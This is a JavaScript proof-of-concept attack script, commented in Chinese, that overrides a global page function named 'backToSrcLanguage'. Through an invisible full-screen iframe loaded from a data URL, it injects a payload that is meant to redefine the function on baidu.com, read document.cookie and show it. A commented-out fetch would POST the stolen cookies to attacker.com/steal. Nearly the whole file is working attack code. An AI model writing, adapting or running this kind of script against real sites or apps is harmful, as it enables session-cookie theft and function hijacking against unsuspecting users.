(function() {
    'use strict';
    
    console.log('🎯 竞态条件攻击 - iframe方案');
    
    let attackTriggered = false;
    
    Object.defineProperty(window, 'backToSrcLanguage', {
        value: function() {
            console.log('🚀 启动竞态攻击');
            
            if (attackTriggered) return;
            attackTriggered = true;
            
            // payload：在百度页面重新定义函数
            const payload = `
            (function() {
                'use strict';
                
                console.log('🎯 竞态payload执行 - 当前URL:', location.href);
                
                if (location.href.includes('baidu.com')) {
                    console.log('✅ 成功抵达百度页面！');
                    
                    // 定义不可修改的恶意函数
                    try {
                        const maliciousFunc = function() {
                            console.log('🔓 恶意函数被调用');
                            const cookieData = document.cookie || '无cookie';
                            alert('敏感数据泄漏:\\n' + cookieData);
                            
                            // 可以发送到远程服务器
                            // fetch('https://attacker.com/steal', {
                            //     method: 'POST',
                            //     body: JSON.stringify({cookie: cookieData})
                            // });
                            
                            return 'data_stolen';
                        };
                        
                        Object.defineProperty(window, 'backToSrcLanguage', {
                            value: maliciousFunc,
                            writable: false,
                            configurable: false
                        });
                        
                        console.log('🎯 backToSrcLanguage 已在百度页面重定义');
                        
                        // 自动测试
                        setTimeout(() => {
                            try {
                                window.backToSrcLanguage();
                            } catch(e) {
                                console.error('测试失败:', e);
                            }
                        }, 1000);
                        
                    } catch(error) {
                        console.error('重定义失败:', error);
                    }
                }
            })();
            `;
            
            // 方法1：iframe竞态攻击
            const iframe = document.createElement('iframe');
            iframe.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                border: none;
                z-index: 999999;
                opacity: 0;
            `;
            
            // 创建携带payload的页面
            const attackPage = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>加载中...</title>
                <script>
                    // 立即执行payload
                    ${payload}
                    
                    // 然后跳转到百度
                    setTimeout(() => {
                        window.location.href = "https://www.baidu.com";
                    }, 10);
                </script>
            </head>
            <body>
                <p>跳转中...</p>
            </body>
            </html>
            `;
            
            iframe.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(attackPage);
            
            // 关键：iframe加载后，payload会在iframe中执行
            iframe.onload = function() {
                console.log('🖼️ iframe加载完成，payload已执行');
                
                // 延迟后移除iframe
                setTimeout(() => {
                    if (iframe.parentNode) {
                        document.body.removeChild(iframe);
                    }
                }, 2000);
            };
            
            document.body.appendChild(iframe);
            
            // 同时主页面也跳转
            setTimeout(() => {
                window.location.href = "https://www.baidu.com";
            }, 100);
            
            return 'race_condition_attack_launched';
        },
        writable: false,
        configurable: false
    });
    
    console.log('✅ 竞态攻击函数已准备');
})();
